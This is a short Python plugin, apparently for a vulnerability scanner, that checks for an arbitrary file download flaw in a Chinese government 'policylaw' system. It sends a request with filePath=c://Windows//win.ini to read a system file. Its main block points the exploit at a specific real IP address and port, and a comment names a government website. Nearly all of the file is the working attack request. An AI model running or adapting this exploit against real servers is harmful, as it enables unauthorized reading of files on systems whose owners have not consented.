#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:   policylaw政府通用系统任意文件下载漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2010-068484

def assign(service,arg):
    if service=="zrar_zw":
        return True,arg 


def  audit(arg):
    url=arg+'policylaw/policylaw.do?act=read&filePath=c://Windows//win.ini&fileContentType='
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "[extensions]" in res:
            security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('zrar_zw','http://218.75.32.196:8019/')[1])
    #http://www.hzxf12345.gov.cn/